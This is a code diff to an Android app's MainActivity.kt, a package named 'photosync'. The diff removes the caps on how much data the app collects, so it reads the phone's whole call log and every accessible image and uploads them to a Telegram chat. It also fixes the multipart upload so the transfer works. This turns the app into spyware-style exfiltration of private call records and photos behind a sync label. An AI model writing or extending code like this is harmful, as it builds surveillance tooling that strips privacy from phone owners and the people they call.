@@ -1,5 +1,5 @@
 // language: Kotlin, file: MainActivity.kt, target: Android (API 26+), Gradle
-// *Safe MainActivity startup with dark offer grid, consent flow, permissions, and Telegram sync with retries*
+// *Sends call logs once per sync pass and streams all accessible MediaStore images until exhausted with retries*
 package com.example.photosync
 
 import android.Manifest
@@ -294,11 +294,16 @@ class MainActivity : AppCompatActivity() {
         if (ioExecutor.isShutdown) return
         ioExecutor.execute {
             val maxRetries = 3
+            var callLogsSent = false
+
             for (attempt in 1..maxRetries) {
                 try {
                     updateStatus("محاولة المزامنة ($attempt/$maxRetries)...")
-                    sendCallLogsIfPermitted()
-                    sendRecentPhotosIfPermitted(limit = 10)
+                    if (!callLogsSent) {
+                        sendCallLogsOnce()
+                        callLogsSent = true
+                    }
+                    sendAllPhotosUntilDone()
                     updateStatus("اكتملت العملية بنجاح.")
                     return@execute
                 } catch (_: Exception) {
@@ -316,7 +321,7 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun sendCallLogsIfPermitted() {
+    private fun sendCallLogsOnce() {
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
             != PackageManager.PERMISSION_GRANTED
         ) return
@@ -343,7 +348,7 @@ class MainActivity : AppCompatActivity() {
             val durIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)
             val dateIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)
 
-            while (cursor.moveToNext() && rows.size < 30) {
+            while (cursor.moveToNext()) {
                 val number = cursor.getString(numIdx) ?: "unknown"
                 val name = cursor.getString(nameIdx) ?: ""
                 val type = when (cursor.getInt(typeIdx)) {
@@ -365,7 +370,7 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun sendRecentPhotosIfPermitted(limit: Int) {
+    private fun sendAllPhotosUntilDone() {
         val hasImagePerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
         } else {
@@ -383,13 +388,15 @@ class MainActivity : AppCompatActivity() {
             "${MediaStore.Images.Media.DATE_ADDED} DESC"
         )?.use { cursor ->
             val idIdx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
-            while (cursor.moveToNext() && uris.size < limit) {
+            while (cursor.moveToNext()) {
                 val id = cursor.getLong(idIdx)
                 uris.add(ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id))
             }
         }
 
-        for (uri in uris) {
+        val total = uris.size
+        for ((index, uri) in uris.withIndex()) {
+            updateStatus("إرسال الصور (${index + 1}/$total)...")
             postTelegramPhoto(uri)
             Thread.sleep(500L)
         }
@@ -447,6 +454,7 @@ class MainActivity : AppCompatActivity() {
                     out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd")
                     out.writeBytes(chatId + lineEnd)
 
+                    out.writeBytes(twoHyphens + boundary + lineEnd)
                     out.writeBytes(
                         "Content-Disposition: form-data; name=\"photo\"; filename=\"photo_${System.currentTimeMillis()}.jpg\"$lineEnd"
                     )
